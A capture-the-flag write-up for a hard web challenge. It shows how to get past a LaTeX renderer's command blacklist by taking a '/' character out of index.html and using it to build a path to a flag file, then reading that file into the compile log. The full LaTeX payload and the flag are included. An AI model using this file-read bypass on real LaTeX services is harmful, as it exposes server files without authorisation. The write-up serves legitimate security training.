
- **Challenge Name:**  Latex
- **Category:** Web
- **Difficulty:** Hard
- **Writeup Author:** HanzalaAbbasi 
- **Challenge Author(s):** HanzalaAbbasi


## Description
Explore the maze of LaTeX's PDF making and HTML data pulling to find the flag

# LaTeX Renderer Exploitation Guide

## Introduction
The website appears to be a renderer for LaTeX code. Writing LaTeX and clicking "Generate PDF" gives a link to the rendered PDF. The output LOG of the LaTeX renderer will also be displayed.

![image](https://github.com/user-attachments/assets/34581452-980e-4c7f-a657-9e10a635a9b2)


## PDF Link
While copying and pasting the provided link into your browser may lead to a PDF document, it may not contain the information you're expecting.

![image](https://github.com/user-attachments/assets/5643547e-6b77-419a-9f38-3d78498a7179)


## Finding the Flag
Looking at the source HTML indicates that we need to read the flag from a file found in `/home/Desktop/trustline/flag/flag.txt`.

![image](https://github.com/user-attachments/assets/58201958-df5a-4bac-8f7f-55ce0d034772)



## Blacklisted Characters Issue
I'm currently encountering an issue where certain characters are being masked, making it difficult to read the flag.

![image](https://github.com/user-attachments/assets/06478759-b913-4fa1-9216-76ccfc5950f8)


## Crafting LaTeX Code to Bypass Blacklisted Characters
Examining the backend code logic, specifically the highlighted section in blue, we can see that it uses a regular expression with `preg_match` to validate the `$CONTENT` variable. This validation checks for the presence of blacklisted commands such as "input", "include", "", "/", "write", "slash", or "^^". If any of these commands are found, the code outputs the message "BLACKLISTED commands used".

To create LaTeX code that bypasses blacklisted characters, it's crucial to have an in-depth understanding of LaTeX. This is because certain characters are blocked which are used to read the files, and without them, rendering a flag might not be possible.

![image](https://github.com/user-attachments/assets/60dcb466-30f6-415e-9045-60899f9c34ed)


## LaTeX Code Snippet
The below LaTeX code snippet is crafted to interact with an HTML file (`index.html`), extracting a specific character from a designated line within the file. Subsequently, this character serves as a crucial component in constructing a file path leading to another file (`flag.txt`). Let's delve into the code:

### Document Class and Packages:

- **`\documentclass{minimal}`**: This declaration assigns the document class as "minimal," tailored to yield a concise output.
- **`\usepackage{xstring}`**: Importing the **`xstring`** package furnishes the script with functionalities for string manipulation.

### Defining Directory Components:

- **`\def\a{home}`**, **`\def\b{Desktop}`**, **`\def\c{trustline}`**, **`\def\d{flag}`**, **`\def\e{flag.txt}`**: These directives establish variables encapsulating segments of the file directory path leading to flag.txt.

### Reading HTML File:

- **`\newread\file`**: This command initializes a file reading operation.
- **`\immediate\openin\file=index.html`**: Opening index.html for reading.
- **`\immediate\read\file to\fileline`**: Each line of the file is read into the macro **`\fileline`**.
- The initial six **`\immediate\read\file to\fileline`** commands handle the first six lines of index.html.
- **`\StrMid{\fileline}{22}{22}[\s]`**: Extracting the 22 character from the sixth line of index.html, storing it in the macro **`\s`**.

The sequence unfolds as follows:

- The first **`\immediate\read\file to\fileline`** reads the first line.
- The second **`\immediate\read\file to\fileline`** reads the second line.
- The third **`\immediate\read\file to\fileline`** reads the third line.
- The fourth **`\immediate\read\file to\fileline`** reads the fourth line.
- The fifth  **`\immediate\read\file to\fileline`** reads the fifth line.
- The six  **`\immediate\read\file to\fileline`** reads the sixth line.
- Consequently, the **`\StrMid{\fileline}{22}{22}[\s]`** command targets the 22 character from the sixth line of the index.html file, which is "/". We can utilize this character to construct our path and **circumvent the blacklisted characters filter.**

![image](https://github.com/user-attachments/assets/b4b469ea-493e-4688-a1df-554966180b98)



## Word Count Verification
The word count for the sixth line is shown below.

![image](https://github.com/user-attachments/assets/b0ad5ced-cb76-4a45-aaa7-377ae1953218)


```
\documentclass{minimal}
\usepackage{xstring}

\def\a{home}
\def\b{Desktop}
\def\c{trustline}
\def\d{flag}
\def\e{flag.txt}

\newread\file
\immediate\openin\file=index.html
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\StrMid{\fileline}{22}{22}[\s]
\immediate\message{\s}
\immediate\closein\file

\immediate\openin\file=\s\a\s\b\s\c\s\d\s\e
\loop\unless\ifeof\file
    \read\file to\fileline
    \message{\fileline}
\repeat
\closein\file

\begin{document}
\end{document} 

```

## Building File Path and Reading Content
Using the above LaTeX code will yield the flag.

![image](https://github.com/user-attachments/assets/45741195-8a7a-4221-a07e-0ff508399219)



## Verifying with Python Script
We can also run a Python script to verify that we have successfully obtained the flag through our LaTeX code.

![image](https://github.com/user-attachments/assets/283d4b32-7db4-458c-8124-7e3bf67d98b8)





## Flag
TRUSTLINE{YoU_HavE_SoLvED_LaTeX_HarD_ChAlleNGE_WeLl_DOne_Xd}
